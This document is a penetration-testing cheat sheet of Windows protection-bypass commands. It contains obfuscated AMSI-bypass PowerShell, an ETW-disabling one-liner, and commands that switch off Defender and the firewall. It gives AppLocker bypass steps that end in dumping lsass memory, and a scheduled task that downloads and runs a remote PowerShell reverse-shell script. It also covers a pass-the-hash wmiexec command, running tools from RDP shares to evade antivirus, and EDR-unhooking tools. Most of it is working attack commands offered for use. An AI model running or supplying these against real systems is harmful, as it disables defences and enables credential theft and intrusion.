==================================================================================================================
Protection bypass - Usefull commands & tricks
==================================================================================================================

INDEX
---------
1.  Commands to disable/bypass Windows Defender AV
2.  Commands to bypass the Antimalware Scan Interface (AMSI) for the current PowerShell session
3.  Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
4.  Commands to bypass/disable Applocker (with local admin priv)
5.  Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
6.  Commands to disable/enable the Windows Firewall 
7.  Commands to enable RDP Access on a Windows machine
8.  Methods to run commands as "NT Authority/System"
9.  Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
10. Unhooking NTDLL.dll to bypass EDR solutions


==================================================================================================================
1. Commands to disable/bypass Windows Defender AV 
==================================================================================================================

1.1 Commands to check if Windows Defender is enabled on a machine
---------------------------------------------------------------------------------
PS C:\Users\jeff> Get-MpComputerStatus | Select AntivirusEnabled

AntivirusEnabled
----------------
            True

PS C:\Users\jeff> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

RealTimeProtectionEnabled : True
IoavProtectionEnabled     : True
AntispywareEnabled        : True


PS C:\Users\jeff> Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

IsTamperProtected         : False
RealTimeProtectionEnabled : True


PS C:\Users\jeff> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

displayName              : Windows Defender
instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46
                           }
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows
                           Defender\MsMpeng.exe
productState             : 397568
timestamp                : Mon, 22 Nov 2021 06:29:02 GMT
PSComputerName           :


1.2 Command to disable real-time monitoring for Windows Defender
---------------------------------------------------------------------------------
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true

Notes:
- Needs to be run from an ELEVATED shell
- A notification is shown to the user 
- Event ID 5001 (Microsoft-Windows-Windows Defender/Operational) - Windows Defender Real-Time Protection was disabled.


1.3 Command to avoid detection of in-memory download execute one liner
---------------------------------------------------------------------------------
PS C:\> Set-MpPreference -DisableIOAVProtection $true

Notes:
- Needs to be run from an ELEVATED shell
- This command doesn't show any notification to the user and
- Event ID 5004 (Microsoft-Windows-Windows Defender/Operational)  - Windows Defender Real-Time Protection feature (IE Downloads and Outlook Express attachments) configuration has changed.


1.4 Command to add a path exclusion for Defender
---------------------------------------------------------------------------------
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"

Note: Needs to be run from an ELEVATED shell


==================================================================================================================
2. Commands to bypass the Antimalware Scan Interface (AMSI) for the current PowerShell session
==================================================================================================================

The AMSI is an interface on which applications or services (third-party included) are able to scan a script’s content for malicious usage. 
If a signature in the script is registered by the AMSI antimalware service provider (Windows Defender by default), it will be blocked.

To put this into context, consider the following steps PowerShell takes to integrate with AMSI:
> When a PowerShell process is created, AMSI.DLL is loaded from disk into its address space.
> Within AMSI.DLL, there’s a function known as AmsiScanBuffer(), essentially the function used to scan a script’s content.
> In the PowerShell command prompt, any supplied content would first be sent to AmsiScanBuffer(), before any execution takes place.
> Subsequently, AmsiScanBuffer() would check with the registered anti-virus to determine if any signatures have been created.
> If the content is deemed malicious, it would be blocked.

Since AMSI relies on being loaded within the process executing the actual script, techniques to break or patch specific functions within amsi.dll are well known.

There are many techniques to bypass AMSI such as:
- patching the amsi.dll in memory
- setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed' are encoded to avoid the AV to detect and block the AMSI bypass)
- forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
- placing a separate amsi.dll in the current working directory (note: legacy technique)
- registry key modification
The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 


# AMSI Bypass generator website
================================
-> https://amsi.fail

The website generates obfuscated PowerShell snippets that break or disable AMSI for the current process. 
The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. 
Every snippet is obfuscated at runtime/request so that no generated output share the same signatures.


Example - AMSI bypass commands using Matt Graebers' reflection method
-----------------------------------------------------------------------------
PS C:> $MM=$null;$oahvolu="$([cHAr]([bYte]0x53)+[cHAR](121*105/105)+[chAr](115+21-21)+[Char]([byTe]0x74)+[CHaR]([byte]0x65)+[ChaR](75+34)).$([Char]([bYTe]0x4d)+[cHAr]([bYtE]0x61)+[ChAR]([bytE]0x6e)+[Char](97+61-61)+[CHAr]([BYTe]0x67)+[CHar](101*38/38)+[cHAR](109*96/96)+[CHaR](101)+[CHAr](86+24)+[cHaR]([Byte]0x74)).$([char](65+12-12)+[CHar]([byTE]0x75)+[chAR]([BYte]0x74)+[CHaR]([ByTE]0x6f)+[chAr](55+54)+[CHAR]([byte]0x61)+[CHAR]([BytE]0x74)+[chaR]([ByTe]0x69)+[CHaR]([BYTE]0x6f)+[CHar](110+76-76)).$(('Ämsì'+'Utìl'+'s').NOrmALiZe([cHAr]([ByTE]0x46)+[chAR](111)+[cHar](114+45-45)+[chAR](12+97)+[char](68+48-48)) -replace [ChaR](92*66/66)+[ChAr]([Byte]0x70)+[chAr](123)+[Char](77)+[cHAr]([byTE]0x6e)+[chAR]([BYTe]0x7d))";
PS C:> $xozwyfnqwkcxmnbsqtqacevqk="+('jîrygvef'+'bqvkndgn').nORmAlIzE([CHar]([BytE]0x46)+[CHAr](111*90/90)+[cHar]([bYTe]0x72)+[ChAr]([bYte]0x6d)+[chaR](68)) -replace [ChAR]([byte]0x5c)+[cHAr]([bYTe]0x70)+[Char](123*44/44)+[CHar](77)+[CHar]([byTe]0x6e)+[chaR]([BYtE]0x7d)";
PS C:> [Threading.Thread]::Sleep(442);
PS C:> [Ref].Assembly.GetType($oahvolu).GetField($([ChAR](97*86/86)+[Char](109+61-61)+[cHaR]([ByTE]0x73)+[ChaR](105)+[char]([BYtE]0x49)+[CHaR](110+46-46)+[CHar](105)+[ChaR]([bYTE]0x74)+[CHAr]([byTe]0x46)+[chAr]([BYtE]0x61)+[ChAR](105*3/3)+[ChAR]([byte]0x6c)+[cHAr]([BYTE]0x65)+[CHAR](100+38-38)),"NonPublic,Static").SetValue($MM,$true);


Example - AMSI bypass commands using Matt Graebers' second reflection method
-----------------------------------------------------------------------------
PS C:> $nQdsMXey=$null;
PS C:> $ofgiwluz="$([char](83+26-26)+[ChaR](121)+[chAr](115+31-31)+[CHar]([byTE]0x74)+[cHAR]([byTe]0x65)+[CHar](109+91-91)).$(('Mânã'+'geme'+'nt').NorMAlize([cHAr]([byte]0x46)+[cHAr]([byTE]0x6f)+[CHar](114+43-43)+[cHAR]([BYTE]0x6d)+[CHAr](68*8/8)) 
-replace [CHaR](84+8)+[cHar](112+83-83)+[ChAr](123*45/45)+[chaR](77*13/13)+[CHar](110*71/71)+[char](125+28-28)).$(('Äutõmât'+'îón').NOrmalIZe([cHAr](70*27/27)+[CHar]([BytE]0x6f)+[char](21+93)+[cHar](29+80)+[CHAR]([BYTe]0x44)) 
-replace [cHaR]([BYtE]0x5c)+[cHar]([ByTE]0x70)+[chaR](123+20-20)+[chAR](77*29/29)+[char]([BYTe]0x6e)+[chAr]([ByTE]0x7d)).$(('ÁmsìUtî'+'ls').nOrmalIzE([CHAR]([BytE]0x46)+[ChaR](111)+[CHar]([byTE]0x72)+[chaR]([BYte]0x6d)+[Char]([bytE]0x44)) 
-replace [cHAR](92+75-75)+[chAR](112)+[chaR]([BytE]0x7b)+[cHaR]([BYTe]0x4d)+[cHaR]([bYtE]0x6e)+[chAr]([ByTe]0x7d))";
PS C:> $inswncssfkwdysj="+[Char](101*12/12)+[ChAr]([BYTe]0x77)+[ChAR](116)+[CHaR]([byte]0x62)+[CHar]([ByTe]0x61)";
PS C:> [Threading.Thread]::Sleep(400);[Runtime.InteropServices.Marshal]::("$(('Wrît'+'eÎnt'+'32').NOrMaliZE([Char]([byte]0x46)+[cHAR](1+110)+[CHAr]([BYte]0x72)+[CHaR](109+80-80)+[chAr]([bYte]0x44)) -replace [CHaR]([bytE]0x5c)+[chAR](112*52/52)+[CHAr]([Byte]0x7b)+[cHaR]([byte]0x4d)+[Char](110*89/89)+[chAR](125*120/120))")([Ref].Assembly.GetType($ofgiwluz).GetField("$(('ãmsî'+'Cónt'+'ext').NOrMalizE([CHaR]([BYTE]0x46)+[ChAr]([ByTE]0x6f)+[ChAR](114+56-56)+[CHAr](109+29-29)+[CHar](47+21)) -replace [Char]([BYte]0x5c)+[char]([bYte]0x70)+[cHar](123+37-37)+[ChaR](77*50/50)+[chAr](110*8/8)+[chAR](125))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($nQdsMXey),0x62c526aa);


Example - AMSI bypass commands by forcing the AMSI initialization to fail in a PowerShell session
--------------------------------------------------------------------------------------------------
PS C:> $KvFBfyuUN=$null;
PS C:> $srbyeq=[$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076));
PS C:> $klotrt="+[chaR]([BYtE]0x64)+[ChAr](102+92-92)+[CHAR](119*88/88)+[CHAR]([byTe]0x63)+[cHar]([BytE]0x64)+[CHaR]([bYtE]0x6c)+[CHar]([bYte]0x69)+[CHAr]([bytE]0x74)+[ChaR]([byTe]0x76)+[cHAr](100)+[cHAr](66+40)+[CHaR](104+67-67)+[chAR](121)+[cHAr]([bYte]0x6e)+[cHAr](100+46-46)+[CHaR]([byTE]0x76)+[CHAR]([bYtE]0x67)+[CHar]([bytE]0x67)+[ChaR](99)+[cHAr]([bYTE]0x78)+[ChAr](104*16/16)+[cHAR]([bYTE]0x6b)+[chaR](97)+[CHar](112)+[CHAR](110)+[CHaR](113*11/11)";
PS C:> [Threading.Thread]::Sleep(960);
PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$([cHAR](97)+[cHar](109*42/42)+[chAr]([Byte]0x73)+[Char]([byTE]0x69)+[ChaR]([bytE]0x53)+[chAR](101*79/79)+[CHAR]([BYTE]0x73)+[CHar](115)+[char](105)+[CHAr](111)+[CHAr](63+47))", "NonPublic,Static").SetValue($KvFBfyuUN, $null);
PS C:> [Ref].Assembly.GetType("$(('Sy'+'st'+'em').NORMAliZE([Char](70*10/10)+[chAR]([BYTe]0x6f)+[CHar]([ByTe]0x72)+[cHAR](109+105-105)+[chaR]([bYTE]0x44)) -replace [cHar]([BYtE]0x5c)+[ChAr]([bYTe]0x70)+[ChAr](123*4/4)+[cHAr]([BYTe]0x4d)+[cHAR](110+101-101)+[CHAR]([BytE]0x7d)).$([chAr](77+53-53)+[char]([BYtE]0x61)+[cHAr]([bytE]0x6e)+[CHaR](97+34-34)+[CHar](103)+[char]([ByTe]0x65)+[CHar]([BYtE]0x6d)+[ChAR]([bYTe]0x65)+[CHaR]([BytE]0x6e)+[char](116+35-35)).$(('Áutô'+'mätì'+'ôn').NoRMALiZE([chAR](45+25)+[CHAr]([BYTE]0x6f)+[ChAr]([Byte]0x72)+[cHaR](109)+[CHAR](68*20/20)) -replace [ChAr]([Byte]0x5c)+[ChaR]([BytE]0x70)+[CHAr](123*115/115)+[CHAr](77*65/65)+[chaR](67+43)+[char](125*12/12)).$(('Ámsí'+'Utíl'+'s').nORmAlizE([CHAR](70*17/17)+[CHar](111)+[char]([BytE]0x72)+[ChAR](109*14/14)+[cHar](68)) -replace [cHAr]([byTE]0x5c)+[cHaR]([Byte]0x70)+[CHAr]([BytE]0x7b)+[ChAR](77*63/63)+[chAr](110+49-49)+[chAR]([Byte]0x7d))").GetField("$(('âm'+'sì'+'Có'+'nt'+'ex'+'t').NORMaLIZe([cHaR]([byTE]0x46)+[chAR]([byte]0x6f)+[cHaR]([BYtE]0x72)+[CHAr]([byte]0x6d)+[chAr](68)) -replace [CHaR]([BytE]0x5c)+[chAr](112*50/50)+[cHAR](77+46)+[CHAR]([ByTE]0x4d)+[Char](110*8/8)+[CHAr](125*18/18))", "NonPublic,Static").SetValue($null, [IntPtr]$srbyeq);


==================================================================================================================
3. Command to disable ETW (Event Tracing for Windoww) for the current PowerShell session
==================================================================================================================

The PowerShell command displayed below sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables 
Suspicious ScriptBlock Logging, etc. 
Please note that this command itself does not attempt to bypass 'Suspicious ScriptBlock Logging' for readability.

PS C:\> [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)


Other - Commands to display event logs
--------------------------------------

> Get-WinEvent
The PowerShell 'Get-WinEvent' cmdlet gets events from event logs, including classic logs, such as the System and Application logs. 
It gets events from event logs and event tracing log files on local and remote computers.
The cmdlet gets data from event logs that are generated by the Windows Event Log technology introduced in Windows Vista and events in log files 
generated by Event Tracing for Windows (ETW). By default, Get-WinEvent returns event information in the order of newest to oldest.

> LOGMAN
The command 'logman query -ets' can also be use to see a list of currently running Trace Event Sessions. 
To kill an existing session, run the command 'logman stop <SessionName> -ets' as an administrator.


==================================================================================================================
4. Commands to bypass/disable Applocker (with local admin priv)
==================================================================================================================

> Usefull inks:
  - https://github.com/api0cradle/UltimateAppLockerByPassList
  - https://github.com/api0cradle/AppLocker-Stuff

> Example of how to bypass Applocker with a local admin account logged on a Windows 2016 server.

Step 1. AppLocker is enabled
-----------------------------------------------------------------------------------------------
C:\Windows\System32\applocker>dir
 Volume in drive C has no label.
 Volume Serial Number is C2E5-D1EC

 Directory of C:\Windows\System32\applocker

04/19/2019  11:34 PM    <DIR>          .
04/19/2019  11:34 PM    <DIR>          ..
04/19/2019  11:34 PM                72 Appx.AppLocker
04/19/2019  11:34 PM                72 Dll.AppLocker
04/19/2019  11:34 PM               960 Exe.AppLocker
04/19/2019  11:34 PM                72 Msi.AppLocker
04/19/2019  11:34 PM             1,808 Script.AppLocker
               5 File(s)          2,984 bytes
               2 Dir(s)  13,920,964,608 bytes free

C:\Windows\System32\applocker> type Exe.AppLocker
ApPF          X            x  H   â•   Ã‡   â””    2   L  8   Â¼     Ã¤  (        Ã‡                                     Ã“ Ã¡           artxÂ°   A P P I D : / / F Q B N Ã§Â°   A P P I D : / / F Q B N PÃ¤   t   O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S \ * \ *         Ã Ã¡     Ã¡             5 a 9 3 4 0 f 3 - f 6 a 7 - 4 8 9 2 - 8 4 a c - 0 f f f d 5 1 d 9 5 8 4 D : ( X A ; ; F X ; ; ; S - 1 - 1 - 0 ; ( ( E x i s t s   A P P I D : / / F Q B N )   & &   ( ( A P P I D : / / F Q B N )   > =   ( { " O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S \ * \ * " , 0 } ) ) ) ) S i g n e d   b y   O = M I C R O S O F T   C O R P O R A T I O N ,   L = R E D M O N D ,   S = W A S H I N G T O N ,   C = U S A p p l o c k e r   P r i v a t e \ L o w B o x   A C E ( A ; ; F X ; ; ; S - 1 - 1 5 - 2 - 1 ) L o w B o x   A C E
C:\Windows\System32\applocker>

Step 2. Delete and replace a modified Applocker EXE file rule "Exe.AppLocker"
-----------------------------------------------------------------------------------------------
> Note: https://github.com/api0cradle/AppLocker-Stuff

C:\Windows\System32\applocker> del Exe.AppLocker
C:\Windows\System32\applocker> put Exe.AppLocker

Step 3. Restart the server - The new AppLocker rule will be valid until a "GPO /update" is done
-----------------------------------------------------------------------------------------------
C:\Windows\System32\applocker> shutdown /r

Step 4. Now we can execute any executable file
-----------------------------------------------------------------------------------------------
C:\Temp> procdump.exe -accepteula -ma lsass.exe memorydump.dmp


==================================================================================================================
5. Commands to enable Windows PowerShell 2.0 in Windows 10 (it requires admin privileges)
====================================================================================================================

Since there is no AMSI in PowerShell v2.0 it is interesting to use it when possible. 
If .Net 3.0 is available on a target Windows 10 machine - which is not by default - PowerShell v2 can be started  with the -Version option.

To disable/enable Windows PowerShell 2.0, copy and paste the command below into an elevated PowerShell prompt, and press enter
-------------------------------------------------------------------------------------------------------------------------------
PS C:\> Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

OR copy and paste the command below into an elevated command prompt, and press enter
-------------------------------------------------------------------------------------
C:\> Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All


==================================================================================================================
6. Commands to disable/enable the Windows Firewall 
==================================================================================================================

To turn OFF/ON the firewall for all 3 'networks'
-------------------------------------------------
C:\> netsh advfirewall set allprofiles state off
C:\> netsh advfirewall set allprofiles state on

Start / Stop firewall service
-----------------------------
C:\> netsh firewall set opmode DISABLE
C:\> netsh firewall set opmode ENABLE

Allow/Deny Ports
-----------------
netsh firewall add portopening TCP _port_number_ _name_ DISABLE ALL
netsh firewall add portopening TCP 3264 CCMAIL DISABLE ALL

netsh firewall add portopening TCP _port_number_ _name_ ENABLE ALL
netsh firewall add portopening TCP 8443 PLESK-ADMIN ENABLE ALL


==================================================================================================================
7. Commands to enable RDP Access on a Windows machine
==================================================================================================================
C:\> reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0

C:\> netsh firewall set service remoteadmin enable

C:\> netsh firewall set service remotedesktop enable


==================================================================================================================
8. Methods to run commands as "NT Authority/System"
==================================================================================================================

From (Local) Administrator to "NT Authority/System":

- Method 1 - PSEXEC
  1. Run as administrator a CMD.EXE prompt
  2. Enter the command: psexec.exe -s -i cmd.exe

- Method 2 - Scheduled Task
  1. C:\>schtasks /create /S server01.domaintest.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.109/InvokePowerShellTcp2.ps1''')'"
         SUCCESS: The scheduled task "testuser" has successfully been created.
  2. C:\>schtasks /Run /S server01.domaintest.local /TN "testuser"
         SUCCESS: Attempted to run the scheduled task "testuser".
         
- Method 3 - Service
  1. Create a service 
     C:\> sc create newcmdsvc binpath= “cmd /K start” type= own type= interact
     or
     C:\> sc create newcmdsvc binpath= “cmd /C ipconfig” type= own type= interact
  2. Start the service to execute the command or obtain a cmd shell as SYSTEM
     C:\> sc start cmdsvc

- Method 4 - Metasploit /Getsystem  //Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors
  $ meterpreter > getsystem		
  [-] priv_elevate_getsystem attempts the following privesc techniques:
  [1] Named Pipe Impersonation (In Memory/Admin)
  [2] Named Pipe Impersonation (Dropper/Admin)
  [3] Token Duplication (In Memory/Admin)
 
- Method 5 - Tokenvator.exe (Win10) - https://blog.netspi.com/tokenvator-a-tool-to-elevate-privilege-using-windows-tokens/
  1. Run the tool using the binary "Tokenvator4.5.exe" as an administrator
  2. Use the command "getsystem"
  Other (run a powershell with UAC bypass)

- Method 6 - Use the Windows privilege "SeDebugPrivilege"
  > Create a new process and set the parent process a privileged process
  > PS script: https://github.com/decoder-it/psgetsystem
  > Commands:
  PS\>: import-module psgetsys.ps1
  PS\>: ./psgetsys.ps1 878 Windows/system32/cmd.exe
  

==================================================================================================================
9. Simple trick to prevent an Antivirus / EndPoint Protection solution to block the execution of a binary
==================================================================================================================

Context: During an internal penetration test you are logged into a Windows server using RDP with a local admin account.
         You tried to upload and execute an obfuscated 'hacking' tool such as rubeus (that you have modified and recompiled) but unfortunately it is
         still detected and deleted by the antivirus solution.

If you don't have the time to recompile your tool to avoid the AV detection you can simply run the tool 'remotely' from your local C: drive shared
throuh the RDP session (i.e. \\tsclient\C\) or from a remote shared drive (i.e. \\servername\share-pentest\). 
In most case, the AV won't block it and your executable will be run.


Example 1 - Sophos Antivirus
----------------------------------------------
On a Windows Server protected by a Sophos AV, my recompiled version of Rubeus was flagged and deleted when I uploaded it, however it was not detected
nor blocked when I ran it from my local C: drive shared throuh my RDP session.

C:\temp > \\tsclient\C\Users\pentester\Documents\Tools\Rubeus.exe kerberoasting /aes /nowrap
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Kerberoasting
<SNIP>


Example 2 - Symantec (EPP) Antivirus
----------------------------------------------
On a Windows Server protected by a Symantec (EPP) Antivirus, my recompiled/packed version of wmiexec.exe was detected and deleted when I uploaded it,
however it was not detected nor blocked when I ran it from a remote shared drive.

C:\> powershell -exec bypass
PS C:\> cd \\servername\share-pentest\
PS \\servername\share-pentest > wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:ad5f04d33d00db5f<SNIP> admin-user@<IP>
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>

==================================================================================================================
10. Unhooking NTDLL.dll to bypass EDR solutions
==================================================================================================================

APIs (application programming interfaces) are the interfaces by which code is used to make things happen on a computer system. 
Windows has a set of APIs (such as syscall) that can be called to execute instructions that require direct system or kernel-level access. 
Most EDR solutions use the gateway NTDLL.dll by “hooking” into it to watch for suspicious calls to memory.

The Windows OS has two different privilege levels, that were implemented to protect the OS from for example crashes caused by installed applications. 
All applications installed on a Windows System run in the so called User-mode and the kernel and device drivers run in the so called Kernel-mode. 

Applications in the User-mode cannot access or manipulate memory sections in the Kernel-mode. AV/EDR systems can only monitor application behaviour in
the User-mode, due to the Kernel Patch Protection. And the very last instance in the User-mode are the Windows API functions from NTDLL.dll. 

If any function from NTDLL.dll is called, the CPU switches to Kernel-mode next, which cannot be monitored by AV/EDR vendors anymore. 
The single functions of NTDLL.dll are called Syscalls.
As of the NTDLL.dll functions are the last intance, that can be monitored for suspicious activities from attackers or malware by AV/EDR vendors, 
they are typically doing exactly that. 
They inject a custom DLL-file into every new process. You can find DLL files, loaded into a process from AV/EDR Vendors via for example 
Sysinternals procexp64.exe.

Unhooking refers to a method that attackers can use to load a fresh, unhooked version of ntdll.dll AFTER Windows has already loaded the EDR-hooked
version at process launch. At this point the EDR is flying blind to any code that is running and it is unable to monitor the return address for 
any API calls made, rendering it useless. 


Examples of tools
===================
> https://github.com/cube0x0/SyscallPack
> https://github.com/Mr-Un1k0d3r/EDRs
> https://github.com/GetRektBoy724/SharpUnhooker
> https://github.com/D1rkMtr/FilelessRemotePE

> Nimcrypt2 is a PE packer/loader designed to bypass AV/EDR. It use direct syscalls and has ability to load regular PE files as well as raw shellcode.
  Nimcrypt2 allows to unhook the ntdll.dll.
  GITHUB: https://github.com/icyguider/Nimcrypt2
